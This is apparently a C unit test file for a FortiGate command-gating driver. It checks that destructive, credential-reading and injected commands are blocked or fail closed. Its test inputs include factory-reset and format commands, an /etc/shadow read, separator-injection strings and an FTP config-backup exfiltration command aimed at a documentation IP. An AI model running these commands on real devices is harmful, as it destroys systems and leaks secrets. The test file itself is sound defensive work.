/*
 * Copyright (c) 2026 Third Level IT LLC. All rights reserved.
 * VIRP — Verified Infrastructure Response Protocol
 * FortiGate Driver — BLACK Tier Enforcement Tests
 *
 * Verifies that all destructive commands are blocked at the driver
 * level before any bytes hit the wire.
 */

#include "virp.h"
#include "virp_driver.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdbool.h>

/* BLACK-tier check plus the gate classifier — no SSH, no libssh2. */
extern bool fg_is_black_tier(const char *command);
extern virp_trust_tier_t fg_route_command(const char *command);

static int tests_run = 0;
static int tests_passed = 0;

#define TEST(name) do { \
    tests_run++; \
    printf("  [%d] %s ... ", tests_run, name); \
} while(0)

#define PASS() do { \
    tests_passed++; \
    printf("PASS\n"); \
} while(0)

/* =========================================================================
 * BLACK Tier: Commands That Must Be Blocked
 * ========================================================================= */

static void test_black_tier_blocked(void)
{
    printf("\n=== BLACK Tier — Must Be Blocked ===\n");

    TEST("execute factoryreset → BLACK");
    assert(fg_is_black_tier("execute factoryreset") == true);
    PASS();

    TEST("execute formatdisk → BLACK");
    assert(fg_is_black_tier("execute formatdisk") == true);
    PASS();

    TEST("execute reboot → BLACK");
    assert(fg_is_black_tier("execute reboot") == true);
    PASS();

    TEST("execute shutdown → BLACK");
    assert(fg_is_black_tier("execute shutdown") == true);
    PASS();

    TEST("fnsysctl ls → BLACK");
    assert(fg_is_black_tier("fnsysctl ls /") == true);
    PASS();

    TEST("fnsysctl cat → BLACK");
    assert(fg_is_black_tier("fnsysctl cat /etc/shadow") == true);
    PASS();

    TEST("fnsysctl ifconfig → BLACK");
    assert(fg_is_black_tier("fnsysctl ifconfig") == true);
    PASS();

    /* Case insensitivity */
    TEST("EXECUTE FACTORYRESET → BLACK (case insensitive)");
    assert(fg_is_black_tier("EXECUTE FACTORYRESET") == true);
    PASS();

    TEST("Execute Reboot → BLACK (case insensitive)");
    assert(fg_is_black_tier("Execute Reboot") == true);
    PASS();

    TEST("FNSYSCTL → BLACK (case insensitive)");
    assert(fg_is_black_tier("FNSYSCTL ls") == true);
    PASS();
}

/* =========================================================================
 * Non-BLACK: Commands That Must Pass Through
 * ========================================================================= */

static void test_non_black_passthrough(void)
{
    printf("\n=== Non-BLACK — Must Pass Through ===\n");

    TEST("get system status → not BLACK");
    assert(fg_is_black_tier("get system status") == false);
    PASS();

    TEST("get system interface → not BLACK");
    assert(fg_is_black_tier("get system interface") == false);
    PASS();

    TEST("execute ping → not BLACK");
    assert(fg_is_black_tier("execute ping 10.0.0.1") == false);
    PASS();

    TEST("execute traceroute → not BLACK");
    assert(fg_is_black_tier("execute traceroute 10.0.0.1") == false);
    PASS();

    TEST("execute ssh → not BLACK");
    assert(fg_is_black_tier("execute ssh admin@10.0.0.1") == false);
    PASS();

    TEST("diagnose sys session stat → not BLACK");
    assert(fg_is_black_tier("diagnose sys session stat") == false);
    PASS();

    TEST("diagnose sniffer packet → not BLACK");
    assert(fg_is_black_tier("diagnose sniffer packet any") == false);
    PASS();

    TEST("null → not BLACK");
    assert(fg_is_black_tier(NULL) == false);
    PASS();

    TEST("empty string → not BLACK");
    assert(fg_is_black_tier("") == false);
    PASS();

    /* 'execute' alone should NOT match */
    TEST("execute (bare) → not BLACK");
    assert(fg_is_black_tier("execute") == false);
    PASS();
}

/* =========================================================================
 * Main
 * ========================================================================= */


/* =========================================================================
 * Adversarial — separator injection (layer 3)
 *
 * The exploit shape: a benign prefix that is a REAL entry in this
 * driver's own table, followed by a separator and a command that was
 * never classified. The prefix match only ever sees the first command
 * while the driver hands the whole string to the device. Every case must
 * fail closed to RED — no benign tier may be inherited.
 *
 * "execute reboot" is a BLACK command here, so the injected half is
 * precisely what must never reach the wire.
 * ========================================================================= */

static void test_adversarial_separators(void)
{
    printf("\n=== Adversarial — separator injection fails closed ===\n");

    TEST("newline: get system status\\nexecute reboot -> RED");
    assert(fg_route_command("get system status\nexecute reboot") == VIRP_TIER_RED); PASS();

    TEST("carriage return: get system status\\rexecute reboot -> RED");
    assert(fg_route_command("get system status\rexecute reboot") == VIRP_TIER_RED); PASS();

    TEST("CRLF: get system status\\r\\nexecute reboot -> RED");
    assert(fg_route_command("get system status\r\nexecute reboot") == VIRP_TIER_RED); PASS();

    TEST("semicolon: get system status;execute reboot -> RED");
    assert(fg_route_command("get system status;execute reboot") == VIRP_TIER_RED); PASS();

    TEST("pipe: get system status|execute reboot -> RED");
    assert(fg_route_command("get system status|execute reboot") == VIRP_TIER_RED); PASS();

    TEST("ampersand: get system status&execute reboot -> RED");
    assert(fg_route_command("get system status&execute reboot") == VIRP_TIER_RED); PASS();

    TEST("double ampersand: get system status&&execute reboot -> RED");
    assert(fg_route_command("get system status&&execute reboot") == VIRP_TIER_RED); PASS();

    TEST("backtick: get system status`execute reboot` -> RED");
    assert(fg_route_command("get system status`execute reboot`") == VIRP_TIER_RED); PASS();

    TEST("command substitution: get system status$(execute reboot) -> RED");
    assert(fg_route_command("get system status$(execute reboot)") == VIRP_TIER_RED); PASS();

    TEST("brace expansion: get system status${x} -> RED");
    assert(fg_route_command("get system status${x}") == VIRP_TIER_RED); PASS();

    TEST("embedded tab: get system status\\texecute reboot -> RED");
    assert(fg_route_command("get system status\texecute reboot") == VIRP_TIER_RED); PASS();

    TEST("trailing newline alone: get system status\\n -> RED");
    assert(fg_route_command("get system status\n") == VIRP_TIER_RED); PASS();

    TEST("leading newline: \\nexecute reboot -> RED");
    assert(fg_route_command("\nexecute reboot") == VIRP_TIER_RED); PASS();
}

/* =========================================================================
 * Legitimate-match regressions (layer 3)
 *
 * The separator/boundary rules must not become over-broad. If a future
 * edit starts rejecting valid FortiGate commands, these fail loudly here
 * rather than degrading the fleet quietly.
 * ========================================================================= */

static void test_legit_matches_unaffected(void)
{
    printf("\n=== Legitimate commands still classify ===\n");

    TEST("exact GREEN entry: get system status");
    assert(fg_route_command("get system status") == VIRP_TIER_GREEN); PASS();

    TEST("longest match: get router info ...");
    assert(fg_route_command("get router info routing-table all") == VIRP_TIER_GREEN); PASS();

    TEST("YELLOW backup path: show full-configuration");
    assert(fg_route_command("show full-configuration") == VIRP_TIER_YELLOW); PASS();

    TEST("RED credential read: show system admin");
    assert(fg_route_command("show system admin") == VIRP_TIER_RED); PASS();

    TEST("RED config-mode change: config system admin");
    assert(fg_route_command("config system admin") == VIRP_TIER_RED); PASS();
}


/* =========================================================================
 * No-match default must FAIL CLOSED (P0)
 *
 * FortiGate's classifier returned YELLOW when no table entry matched. The
 * default gate threshold is YELLOW, so an unlisted command CLEARED the
 * gate and executed. Only the Cisco classifier failed closed to RED.
 *
 * Each command below is plausible, unlisted, and state-changing or
 * sensitive — every one of them executed before this change.
 * ========================================================================= */

static void test_no_match_fails_closed(void)
{
    printf("\n=== No-match default fails closed to RED ===\n");

    TEST("unlisted: edit 1 -> RED (config-object edit — the config-write verb set)");
    assert(fg_route_command("edit 1") == VIRP_TIER_RED); PASS();

    TEST("unlisted: unset admin-lockout-threshold -> RED (removes a security control)");
    assert(fg_route_command("unset admin-lockout-threshold") == VIRP_TIER_RED); PASS();

    TEST("unlisted: set password ABC123 -> RED (credential write)");
    assert(fg_route_command("set password ABC123") == VIRP_TIER_RED); PASS();

    TEST("NULL command -> RED (fail closed)");
    assert(fg_route_command(NULL) == VIRP_TIER_RED); PASS();

    /* REGRESSION (2026-08-09): tier rows match case-sensitively now —
     * the driver executes the caller's ORIGINAL bytes, so the table may
     * not vouch for a spelling it did not literally see. The
     * FG_BLACK_COMMANDS deny list stays case-insensitive on purpose
     * (pinned above in test_black_tier_blocked). */
    TEST("GET SYSTEM STATUS -> RED (case variant is unlisted)");
    assert(fg_route_command("GET SYSTEM STATUS") == VIRP_TIER_RED); PASS();

    TEST("Get system status -> RED");
    assert(fg_route_command("Get system status") == VIRP_TIER_RED); PASS();

    TEST("get system status (control, exact case) keeps its tier");
    assert(fg_route_command("get system status") != VIRP_TIER_RED); PASS();
}

extern size_t fg_route_table_count(void);
extern const char *fg_route_table_entry(size_t i, virp_trust_tier_t *tier);

/* Tier name helper for the table-driven suite's labels. */
static const char *tier_name(virp_trust_tier_t t)
{
    switch (t) {
    case VIRP_TIER_GREEN:  return "GREEN";
    case VIRP_TIER_YELLOW: return "YELLOW";
    case VIRP_TIER_RED:    return "RED";
    case VIRP_TIER_BLACK:  return "BLACK";
    default:               return "UNCLASSIFIED";
    }
}

/* =========================================================================
 * Table-driven reachability + declared-tier suite
 *
 * Iterates FortiGate's OWN classification table and asserts, for every
 * entry, that fg_route_command(entry) returns the tier that entry declares.
 *
 * This is not tautological. It proves two things hand-written cases
 * cannot:
 *   1. REACHABILITY — an entry shadowed by a broader or earlier entry
 *      would silently never fire. A BLACK or RED entry shadowed by a
 *      GREEN one is a live vulnerability. This table is longest-match and contains deliberately broad
 *      catch-alls ("show", "config") that could swallow later entries.
 *   2. The entry returns its declared tier through the REAL matching
 *      logic, including the separator and token-boundary rules.
 *
 * Any new entry is covered automatically the moment it is added.
 * ========================================================================= */

static void test_table_driven_all_entries(void)
{
    printf("\n=== Table-driven: every table entry reachable + correctly tiered ===\n");
    size_t total = fg_route_table_count();
    size_t skipped = 0;

    for (size_t i = 0; i < total; i++) {
        virp_trust_tier_t declared;
        const char *cmd = fg_route_table_entry(i, &declared);
        assert(cmd != NULL);

        char label[192];
        snprintf(label, sizeof(label), "entry[%zu] %s -> %s",
                 i, cmd, tier_name(declared));
        TEST(label);
        virp_trust_tier_t got = fg_route_command(cmd);
        if (got != declared) {
            printf("\n    SHADOWED or MIS-TIERED: \"%s\" declares %s but "
                   "classifies %s\n", cmd, tier_name(declared), tier_name(got));
            assert(got == declared);
        }
        PASS();
    }

    printf("  (%zu entries checked, %zu known-dead skipped)\n",
           total - skipped, skipped);
}


/* =========================================================================
 * Catch-all removal: credential-read variants must fail closed
 *
 * The bare { "show", YELLOW } entry used to catch any variant of a RED
 * credential read that lost its token boundary, handing it YELLOW —
 * below the gate threshold, so it executed. With the catch-all gone
 * these fall to the fail-closed RED default.
 * ========================================================================= */

static void test_credential_read_variants_fail_closed(void)
{
    printf("\n=== Credential-read variants fail closed (catch-all removed) ===\n");

    TEST("show system admins -> RED (was YELLOW via catch-all)");
    assert(fg_route_command("show system admins") == VIRP_TIER_RED); PASS();

    TEST("show system admin-profile -> RED (was YELLOW via catch-all)");
    assert(fg_route_command("show system admin-profile") == VIRP_TIER_RED); PASS();

    TEST("show system api-users -> RED (was YELLOW via catch-all)");
    assert(fg_route_command("show system api-users") == VIRP_TIER_RED); PASS();

    TEST("show users -> RED (was YELLOW via catch-all)");
    assert(fg_route_command("show users") == VIRP_TIER_RED); PASS();

    /* The exact RED entries are unaffected. */
    TEST("show system admin -> RED (exact entry, unchanged)");
    assert(fg_route_command("show system admin") == VIRP_TIER_RED); PASS();

    TEST("show user local -> RED (exact entry, unchanged)");
    assert(fg_route_command("show user local") == VIRP_TIER_RED); PASS();

    /* An arbitrary unlisted show no longer rides a catch-all. */
    TEST("show blahblah -> RED (no catch-all to inherit)");
    assert(fg_route_command("show blahblah") == VIRP_TIER_RED); PASS();

    /* The benign reads that lost their only path keep an explicit tier. */
    TEST("show system global -> YELLOW (explicit config read)");
    assert(fg_route_command("show system global") == VIRP_TIER_YELLOW); PASS();

    TEST("show system dns -> YELLOW (explicit config read)");
    assert(fg_route_command("show system dns") == VIRP_TIER_YELLOW); PASS();

    TEST("show system ha -> YELLOW (explicit config read)");
    assert(fg_route_command("show system ha") == VIRP_TIER_YELLOW); PASS();

    TEST("show system snmp sysinfo -> YELLOW (explicit config read)");
    assert(fg_route_command("show system snmp sysinfo") == VIRP_TIER_YELLOW); PASS();

    TEST("show system dhcp server -> YELLOW (explicit config read)");
    assert(fg_route_command("show system dhcp server") == VIRP_TIER_YELLOW); PASS();

    TEST("show system central-management -> YELLOW (explicit config read)");
    assert(fg_route_command("show system central-management") == VIRP_TIER_YELLOW); PASS();

    TEST("show system fortiguard -> YELLOW (explicit config read)");
    assert(fg_route_command("show system fortiguard") == VIRP_TIER_YELLOW); PASS();

    TEST("show log setting -> YELLOW (explicit config read)");
    assert(fg_route_command("show log setting") == VIRP_TIER_YELLOW); PASS();

    TEST("show antivirus profile -> YELLOW (explicit config read)");
    assert(fg_route_command("show antivirus profile") == VIRP_TIER_YELLOW); PASS();

    TEST("show webfilter profile -> YELLOW (explicit config read)");
    assert(fg_route_command("show webfilter profile") == VIRP_TIER_YELLOW); PASS();

    TEST("show system interface physical -> YELLOW (via show system interface)");
    assert(fg_route_command("show system interface physical") == VIRP_TIER_YELLOW); PASS();
}

/* =========================================================================
 * Audit §4.3 — `execute backup` must not run unapproved
 *
 * `execute backup config ftp <file> <server> <user> <pass>` makes the
 * DEVICE push its entire config — admin password hashes, VPN PSKs, API
 * tokens — to a caller-supplied host. The O-Node never sees the bytes,
 * so nothing about that transfer is observed, signed, or chained. It was
 * classified YELLOW, which at the shipped gate_max_tier=yellow means it
 * executed with no approval: untraced egress to an attacker-chosen
 * destination.
 *
 * `gate_tier_blocks()` is static in virp_onode.c and cannot be linked
 * here, so its rule is mirrored below. The mirror is asserted against
 * known-good pairs first, so it cannot drift into vacuous agreement.
 * ========================================================================= */

static bool gate_blocks(virp_trust_tier_t tier, virp_trust_tier_t max_tier)
{
    if (tier == VIRP_TIER_UNCLASSIFIED) return true;
    if (tier == VIRP_TIER_BLACK)        return true;
    return tier > max_tier;
}

static void test_execute_backup_is_gated(void)
{
    printf("\n=== Audit §4.3 — execute backup is gated at yellow ===\n");

    /* Guard the mirror itself before relying on it. */
    TEST("mirror sanity: GREEN passes, RED blocks at max=YELLOW");
    assert(gate_blocks(VIRP_TIER_GREEN,  VIRP_TIER_YELLOW) == false);
    assert(gate_blocks(VIRP_TIER_YELLOW, VIRP_TIER_YELLOW) == false);
    assert(gate_blocks(VIRP_TIER_RED,    VIRP_TIER_YELLOW) == true);
    PASS();

    TEST("execute backup -> RED (not YELLOW)");
    assert(fg_route_command("execute backup") == VIRP_TIER_RED);
    assert(fg_route_command("execute backup") != VIRP_TIER_YELLOW);
    PASS();

    /* The actual exfil form, with a caller-controlled destination. */
    TEST("execute backup config ftp <file> <host> <user> <pass> -> RED");
    assert(fg_route_command(
        "execute backup config ftp cfg.bak 203.0.113.9 evil pass")
        == VIRP_TIER_RED);
    PASS();

    TEST("execute backup DOES NOT execute at gate_max_tier=yellow");
    assert(gate_blocks(fg_route_command("execute backup"),
                       VIRP_TIER_YELLOW) == true);
    assert(gate_blocks(fg_route_command(
        "execute backup config ftp cfg.bak 203.0.113.9 evil pass"),
        VIRP_TIER_YELLOW) == true);
    PASS();

    /* Case-insensitivity must not open a bypass. */
    TEST("EXECUTE BACKUP (case variants) still RED");
    assert(fg_route_command("EXECUTE BACKUP") == VIRP_TIER_RED);
    assert(fg_route_command("Execute Backup config tftp x 203.0.113.9")
           == VIRP_TIER_RED);
    PASS();

    /*
     * The in-band config read is deliberately NOT swept up: it returns
     * the config THROUGH the O-Node, which signs and chains what it saw.
     * That distinction is the whole point of the tier split, so pin it.
     */
    TEST("show full-configuration stays YELLOW (in-band, gets signed)");
    assert(fg_route_command("show full-configuration") == VIRP_TIER_YELLOW);
    assert(gate_blocks(VIRP_TIER_YELLOW, VIRP_TIER_YELLOW) == false);
    PASS();
}

/* =========================================================================
 * Read-only audit set (2026-08-19)
 *
 * The GREEN table was widened so a read-only auditor can work without
 * an approval round-trip. Implemented as EXPLICIT entries, not a
 * { "get ", GREEN } / { "show ", GREEN } prefix pair: the bare `show`
 * catch-all removed in b26e34d undercut the RED credential entries, and
 * a GREEN prefix would do the same one tier lower. The second half of
 * this suite pins the boundaries that make the explicit form safe.
 * ========================================================================= */

static void test_readonly_audit_set_is_green(void)
{
    printf("\n=== Read-only audit set classifies GREEN ===\n");

    TEST("get system global -> GREEN");
    assert(fg_route_command("get system global") == VIRP_TIER_GREEN); PASS();

    TEST("get system service -> GREEN");
    assert(fg_route_command("get system service") == VIRP_TIER_GREEN); PASS();

    TEST("get system certificate local -> GREEN");
    assert(fg_route_command("get system certificate local") == VIRP_TIER_GREEN); PASS();

    TEST("get vpn ssl settings -> GREEN");
    assert(fg_route_command("get vpn ssl settings") == VIRP_TIER_GREEN); PASS();

    TEST("get wireless-controller vap -> GREEN");
    assert(fg_route_command("get wireless-controller vap") == VIRP_TIER_GREEN); PASS();

    TEST("show firewall policy -> GREEN (beats \"show firewall\" YELLOW)");
    assert(fg_route_command("show firewall policy") == VIRP_TIER_GREEN); PASS();

    TEST("show firewall address -> GREEN");
    assert(fg_route_command("show firewall address") == VIRP_TIER_GREEN); PASS();

    TEST("show vpn ipsec phase2-interface -> GREEN");
    assert(fg_route_command("show vpn ipsec phase2-interface") == VIRP_TIER_GREEN); PASS();

    TEST("diagnose sys session stat -> GREEN (beats \"diagnose\" YELLOW)");
    assert(fg_route_command("diagnose sys session stat") == VIRP_TIER_GREEN); PASS();

    /* Already GREEN before this change — pinned so the widening did not
     * accidentally shadow them with a longer non-GREEN entry. */
    TEST("get system interface -> GREEN (pre-existing)");
    assert(fg_route_command("get system interface") == VIRP_TIER_GREEN); PASS();

    TEST("get router info routing-table all -> GREEN (pre-existing)");
    assert(fg_route_command("get router info routing-table all")
           == VIRP_TIER_GREEN); PASS();

    /* Leading whitespace is stripped before matching. */
    TEST("\" show firewall policy\" -> GREEN (leading space stripped)");
    assert(fg_route_command("  show firewall policy") == VIRP_TIER_GREEN); PASS();
}

/* =========================================================================
 * Hard boundaries — the widening must not reach these
 *
 * config / execute / all-other-diagnose / show full-configuration.
 * ========================================================================= */

static void test_audit_widening_hard_boundaries(void)
{
    printf("\n=== Hard boundaries stay non-GREEN ===\n");

    TEST("config system admin -> not GREEN (RED)");
    assert(fg_route_command("config system admin") != VIRP_TIER_GREEN);
    assert(fg_route_command("config system admin") == VIRP_TIER_RED); PASS();

    TEST("execute reboot -> not GREEN");
    assert(fg_route_command("execute reboot") != VIRP_TIER_GREEN); PASS();

    TEST("show full-configuration -> not GREEN (stays YELLOW backup path)");
    assert(fg_route_command("show full-configuration") != VIRP_TIER_GREEN);
    assert(fg_route_command("show full-configuration") == VIRP_TIER_YELLOW); PASS();

    TEST("diagnose sys session clear -> not GREEN");
    assert(fg_route_command("diagnose sys session clear") != VIRP_TIER_GREEN);
    assert(fg_route_command("diagnose sys session clear") == VIRP_TIER_YELLOW); PASS();

    /* Every OTHER config/execute/diagnose form is untouched by the widening. */
    TEST("config firewall policy -> not GREEN");
    assert(fg_route_command("config firewall policy") != VIRP_TIER_GREEN); PASS();

    TEST("config system interface -> not GREEN");
    assert(fg_route_command("config system interface") != VIRP_TIER_GREEN); PASS();

    TEST("execute factoryreset -> not GREEN");
    assert(fg_route_command("execute factoryreset") != VIRP_TIER_GREEN); PASS();

    TEST("execute shutdown -> not GREEN");
    assert(fg_route_command("execute shutdown") != VIRP_TIER_GREEN); PASS();

    TEST("execute backup config ftp ... -> not GREEN (still RED)");
    assert(fg_route_command("execute backup config ftp c.bak 203.0.113.9 e p")
           == VIRP_TIER_RED); PASS();

    TEST("diagnose debug enable -> not GREEN");
    assert(fg_route_command("diagnose debug enable") != VIRP_TIER_GREEN); PASS();

    TEST("diagnose debug application ike -1 -> not GREEN");
    assert(fg_route_command("diagnose debug application ike -1")
           != VIRP_TIER_GREEN); PASS();

    TEST("diagnose sys session full-stat -> not GREEN");
    assert(fg_route_command("diagnose sys session full-stat")
           != VIRP_TIER_GREEN); PASS();

    TEST("diagnose sniffer packet any -> not GREEN");
    assert(fg_route_command("diagnose sniffer packet any")
           != VIRP_TIER_GREEN); PASS();
}

/* =========================================================================
 * The widening must not undercut the RED credential entries
 *
 * This is the failure mode that killed the { "show", YELLOW } catch-all
 * (b26e34d). Every new entry is >= 3 tokens and none is a prefix of a
 * RED entry's suffixed variant, so these must all still fail closed.
 * ========================================================================= */

static void test_audit_widening_does_not_undercut_red(void)
{
    printf("\n=== Credential reads unaffected by the widening ===\n");

    TEST("get system admin -> still RED");
    assert(fg_route_command("get system admin") == VIRP_TIER_RED); PASS();

    TEST("show system admin -> still RED");
    assert(fg_route_command("show system admin") == VIRP_TIER_RED); PASS();

    TEST("show system admins -> still RED (boundary variant)");
    assert(fg_route_command("show system admins") == VIRP_TIER_RED); PASS();

    TEST("get system api-user -> still RED");
    assert(fg_route_command("get system api-user") == VIRP_TIER_RED); PASS();

    TEST("show user local -> still RED");
    assert(fg_route_command("show user local") == VIRP_TIER_RED); PASS();

    TEST("show vpn ipsec phase1-interface -> not GREEN (carries psksecret)");
    assert(fg_route_command("show vpn ipsec phase1-interface")
           != VIRP_TIER_GREEN);
    assert(fg_route_command("show vpn ipsec phase1-interface")
           == VIRP_TIER_YELLOW); PASS();

    TEST("show system ha -> still YELLOW (encrypted HA password)");
    assert(fg_route_command("show system ha") == VIRP_TIER_YELLOW); PASS();

    /* Suffixed variants of the NEW GREEN entries lose the boundary and
     * must fall to the fail-closed default, never to GREEN. */
    TEST("get system globals -> RED (boundary variant of a new entry)");
    assert(fg_route_command("get system globals") == VIRP_TIER_RED); PASS();

    TEST("show firewall policy6 -> not GREEN (boundary variant)");
    assert(fg_route_command("show firewall policy6") != VIRP_TIER_GREEN); PASS();

    TEST("diagnose sys session statx -> not GREEN (boundary variant)");
    assert(fg_route_command("diagnose sys session statx")
           != VIRP_TIER_GREEN); PASS();

    /* Case-sensitivity of the tier table still holds for new entries. */
    TEST("SHOW FIREWALL POLICY -> RED (case variant is unlisted)");
    assert(fg_route_command("SHOW FIREWALL POLICY") == VIRP_TIER_RED); PASS();

    /* Separator injection behind a new GREEN entry still fails closed. */
    TEST("show firewall policy;execute reboot -> RED");
    assert(fg_route_command("show firewall policy;execute reboot")
           == VIRP_TIER_RED); PASS();

    TEST("diagnose sys session stat\nexecute reboot -> RED");
    assert(fg_route_command("diagnose sys session stat\nexecute reboot")
           == VIRP_TIER_RED); PASS();
}

int main(void)
{
    printf("VIRP FortiGate Driver — BLACK Tier Enforcement Tests\n");
    printf("====================================================\n");

    test_black_tier_blocked();
    test_non_black_passthrough();

    test_adversarial_separators();
    test_legit_matches_unaffected();
    test_no_match_fails_closed();
    test_table_driven_all_entries();
    test_credential_read_variants_fail_closed();
    test_execute_backup_is_gated();
    test_readonly_audit_set_is_green();
    test_audit_widening_hard_boundaries();
    test_audit_widening_does_not_undercut_red();
    printf("\n====================================================\n");
    printf("Results: %d/%d passed\n", tests_passed, tests_run);

    return (tests_passed == tests_run) ? 0 : 1;
}
